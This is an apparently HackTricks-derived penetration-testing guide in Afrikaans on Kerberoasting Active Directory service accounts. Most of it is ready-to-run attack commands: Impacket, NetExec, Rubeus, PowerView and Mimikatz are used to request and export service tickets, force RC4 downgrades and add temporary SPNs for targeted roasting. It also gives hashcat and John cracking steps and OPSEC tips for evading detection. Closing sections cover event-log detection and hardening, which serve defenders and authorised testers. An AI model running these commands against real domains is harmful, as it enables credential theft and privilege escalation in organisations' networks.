# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting fokus op die verkryging van TGS-kaartjies, spesifiek dié wat verband hou met dienste wat onder gebruikersrekeninge in Active Directory (AD) loop, uitgesonderd rekenaarrekeninge. Die enkripsie van hierdie kaartjies gebruik sleutels wat van gebruikerwagwoorde afgelei word, wat offline cracking van geloofsbriewe moontlik maak. Die gebruik van ’n gebruikersrekening as ’n diens word aangedui deur ’n nie-leë ServicePrincipalName (SPN)-eienskap.

Enige geverifieerde domeingebruiker kan TGS-kaartjies aanvra, dus is geen spesiale regte nodig nie.<sup>[[4]](#references)[[5]](#references)</sup>

### Kernpunte

- Teiken TGS-kaartjies vir dienste wat onder gebruikersrekeninge loop (d.w.s. rekeninge met ’n ingestelde SPN; nie rekenaarrekeninge nie).
- Kaartjies word geënkripteer met ’n sleutel wat van die diensrekening se wagwoord afgelei is en kan offline gekraak word.
- Geen verhoogde regte nodig nie; enige geverifieerde rekening kan TGS-kaartjies aanvra.

> [!WARNING]
> Die meeste publieke nutsmiddels verkies om RC4-HMAC (etype 23)-dienskaartjies aan te vra omdat dit vinniger is om te crack as AES. RC4 TGS-hashes begin met `$krb5tgs$23$*`, AES128 met `$krb5tgs$17$*` en AES256 met `$krb5tgs$18$*`. Baie omgewings beweeg egter oor na slegs AES. Moenie aanvaar dat slegs RC4 relevant is nie.
> Vermy ook “spray-and-pray”-roasting. Rubeus se verstek-kerberoast kan navraag doen en kaartjies vir alle SPN’s aanvra, wat baie geraas veroorsaak. Enumereer eers en teiken interessante prinsipale.

### Diensrekeninggeheime en die koste van Kerberos-kripto

Baie dienste loop steeds onder gebruikersrekeninge met handmatig bestuurde wagwoorde. Die KDC enkripteer dienskaartjies met sleutels wat van hierdie wagwoorde afgelei is en gee die syferteks aan enige geverifieerde prinsipaal, dus bied kerberoasting onbeperkte offline raaiskote sonder rekeninguitsluitings of DC-telemetrie. Die enkripsiemodus bepaal die cracking-begroting:

| Modus | Sleutelafleiding | Enkripsietipe | Benaderde RTX 5090-deurset* | Notas |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 met 4,096 iterasies en ’n sout per prinsipaal wat van die domein + SPN gegenereer word | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 miljoen raaiskote/s | Sout verhoed reënboogtabelle, maar laat steeds vinnige cracking van kort wagwoorde toe. |
| RC4 + NT-hash | Enkele MD4 van die wagwoord (ongesoute NT-hash); Kerberos meng slegs ’n 8-greep-konfundeerder per kaartjie in | etype 23 (`$krb5tgs$23$`) | ~4.18 **miljard** raaiskote/s | ~1000× vinniger as AES; aanvallers dwing RC4 af wanneer `msDS-SupportedEncryptionTypes` dit toelaat. |

*Toetse deur Chick3nman, soos aangehaal in [Matthew Green se Kerberoasting-ontleding](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

RC4 se konfundeerder ewekansig slegs die keystream; dit voeg nie werk per raaiskoot by nie. Tensy diensrekeninge op ewekansige geheime staatmaak (gMSA/dMSA, masjienrekeninge of kluisbestuurde stringe), word die spoed van kompromittering uitsluitlik deur die GPU-begroting bepaal. Die afdwing van slegs AES-etypes verwyder die afgradering na miljarde raaiskote per sekonde, maar swak menslike wagwoorde word steeds deur PBKDF2 gekraak.<sup>[[3]](#references)</sup>

### Aanval

#### Linux

’n Praktiese voorbeeld van begin tot einde, wat NetExec gebruik om crackbare kaartjies aan te vra en Hashcat om hulle te crack, is beskikbaar in verwysing [1].<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Nutsmiddels met veelvuldige funksies, insluitend kerberoast-kontroles:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Lys kerberoastable gebruikers

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technique 1: Vra vir TGS en dump uit geheue

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Tegniek 2: Outomatiese tools

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> ’n TGS-versoek genereer Windows Security Event 4769 (’n Kerberos-dienskaartjie is aangevra).

### OPSEC en omgewings wat slegs AES gebruik

- Versoek doelbewus RC4 vir rekeninge sonder AES:
  - Rubeus: `/rc4opsec` gebruik tgtdeleg om rekeninge sonder AES op te spoor en versoek RC4-dienskaartjies.
  - Rubeus: `/tgtdeleg` saam met kerberoast veroorsaak ook RC4-versoeke waar moontlik.<sup>[[6]](#references)</sup>
- Roast rekeninge wat slegs AES gebruik, eerder as om stilweg te misluk:
  - Rubeus: `/aes` spoor rekeninge op met AES geaktiveer en versoek AES-dienskaartjies (etype 17/18).
  - As jy reeds ’n TGT het (PTT of uit ’n .kirbi), kan jy `/ticket:<blob|path>` saam met `/spn:<SPN>` of `/spns:<file>` gebruik en LDAP oorslaan.
- Teikening, beperking van versoeke en minder geraas:
  - Gebruik `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` en `/jitter:<1-100>`.
  - Filtreer vir waarskynlike swak wagwoorde met `/pwdsetbefore:<MM-dd-yyyy>` (ouer wagwoorde) of teiken bevoorregte OUs met `/ou:<DN>`.<sup>[[8]](#references)</sup>

Voorbeelde (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Volharding / Misbruik

As jy 'n rekening beheer of kan wysig, kan jy dit kerberoastable maak deur 'n SPN by te voeg:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Gradeer ’n rekening af om RC4 vir makliker cracking te aktiveer (vereis skryfregte op die teikenobjek):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast via GenericWrite/GenericAll oor ’n gebruiker (tydelike SPN)

Wanneer BloodHound wys dat jy beheer oor ’n gebruikersobjek het (bv. GenericWrite/GenericAll), kan jy daardie spesifieke gebruiker betroubaar “targeted-roast”, selfs al het hulle tans geen SPNs nie:<sup>[[9]](#references)</sup>

- Voeg ’n tydelike SPN by die gebruiker waaroor jy beheer het om dit roastable te maak.
- Versoek ’n TGS-REP wat met RC4 (etype 23) geënkripteer is vir daardie SPN, om cracking te bevoordeel.
- Crack die `$krb5tgs$23$...`-hash met hashcat.
- Verwyder die SPN om die voetspoor te verklein.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux-eenreël-opdrag (targetedKerberoast.py outomatiseer add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Kraak die uitvoer met hashcat se outomatiese opsporing (modus 13100 vir `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Opsporingsnotas: die byvoeging/verwydering van SPNs veroorsaak directory-veranderinge (Event ID 5136/4738 op die teikengebruiker), en die TGS-versoek genereer Event ID 4769. Oorweeg throttling en tydige opruiming.

Jy kan nuttige tools vir Kerberoast-aanvalle hier vind: https://github.com/nidem/kerberoast

As jy hierdie fout van Linux kry: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, is dit weens plaaslike tydverskuiwing. Sinkroniseer met die DC:

- `ntpdate <DC_IP>` (verouderd op sommige distros)
- `rdate -n <DC_IP>`

### Kerberoast sonder 'n domeinrekening (AS-requested STs)

In September 2022 het Charlie Clark gewys dat as 'n principal nie pre-authentication vereis nie, dit moontlik is om 'n service ticket via 'n aangepaste KRB_AS_REQ te verkry deur die sname in die versoekliggaam te verander, wat effektief 'n service ticket in plaas van 'n TGT oplewer. Dit weerspieël AS-REP roasting en vereis nie geldige domeinbewyse nie.

Sien besonderhede: Semperis se write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Jy moet 'n lys gebruikers verskaf, want sonder geldige aanmeldbewyse kan jy nie LDAP met hierdie tegniek navraag doen nie.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Verwant

As jy AS-REP roastable users teiken, sien ook:

{{#ref}}
asreproast.md
{{#endref}}

### Opsporing

Kerberoasting kan ongemerk plaasvind. Soek na Event ID 4769 vanaf DC's en pas filters toe om geraas te verminder:

- Sluit diensnaam `krbtgt` en diensname wat eindig met `$` (rekenaarrekeninge) uit.
- Sluit versoeke vanaf masjienrekeninge (`*$$@*`) uit.
- Slegs suksesvolle versoeke (Failure Code `0x0`).
- Hou enkripsietipes dop: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Moenie slegs op `0x17` waarsku nie.

Voorbeeld van PowerShell-triage:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Aanvullende idees:

- Stel ’n basislyn vir normale SPN-gebruik per gasheer/gebruiker vas; waarsku oor groot sarsies unieke SPN-versoeke vanaf ’n enkele principal.
- Merk ongewone RC4-gebruik in AES-verharde domeine.

### Versagting / Verharding

- Gebruik gMSA/dMSA- of masjienrekeninge vir dienste. Bestuurde rekeninge het ewekansige wagwoorde van 120+ karakters wat outomaties roteer, wat offline cracking onprakties maak.<sup>[[7]](#references)</sup>
- Dwing AES af vir diensrekeninge deur `msDS-SupportedEncryptionTypes` op slegs AES te stel (desimaal 24 / heksadesimaal 0x18), en roteer dan die wagwoord sodat AES-sleutels afgelei word.<sup>[[7]](#references)</sup>
- Waar moontlik, deaktiveer RC4 in jou omgewing en monitor pogings om RC4 te gebruik. Op DCs kan jy die `DefaultDomainSupportedEncTypes`-registerwaarde gebruik om die verstekwaardes te bepaal vir rekeninge waarvoor `msDS-SupportedEncryptionTypes` nie gestel is nie. Toets deeglik.
- Verwyder onnodige SPNs van gebruikersrekeninge.<sup>[[7]](#references)</sup>
- Gebruik lang, ewekansige wagwoorde vir diensrekeninge (25+ karakters) indien bestuurde rekeninge nie haalbaar is nie; verbied algemene wagwoorde en oudit gereeld.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat-kraking in die praktyk](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Laetegnologie-aanvalle met groot impak deur verouderde Kerberos-kriptografie (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Hoe val jy Kerberos aan?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Misbruik van Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Versoek RC4-geënkripteerde TGS wanneer AES geaktiveer is](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft se leiding om Kerberoasting te help versag](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Dokumentasie vir die Rubeus kerberoast-opdrag](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync na DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Nuwe aanvalspaaie? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
